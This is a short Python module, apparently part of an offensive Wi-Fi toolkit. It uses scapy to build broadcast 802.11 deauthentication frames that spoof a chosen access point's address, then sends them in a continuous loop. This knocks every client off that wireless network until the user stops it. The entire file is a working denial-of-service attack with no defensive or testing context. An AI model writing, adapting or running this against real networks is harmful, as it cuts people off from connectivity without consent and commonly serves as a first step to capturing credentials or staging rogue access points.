# core/WIFI/deauth.py
import time

from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from debugs import debug


def deauth_all(access_point, interface):
    t = time.perf_counter()
    timer = True
    packet = RadioTap() / Dot11(
        addr1="FF:FF:FF:FF:FF:FF",
        addr2=access_point,
        addr3=access_point,
    ) / Dot11Deauth(reason=7)
    debug("info", "Starting deauth attack... Press Ctrl+C to stop.")

    while True:
        try:
            sendp(packet, inter=0.01, count=5, iface=interface, verbose=0)
            if timer:
                elapsed = time.perf_counter() - t
                debug("info", f"[*] Sent 5 deauth packets in {elapsed:.2f}s")
                timer = False
        except KeyboardInterrupt:
            debug("info", "Deauth attack interrupted by user")
            break
        except Exception as e:
            debug("critical", f"Deauth packet send failed: {e}")
            time.sleep(0.1)
            break
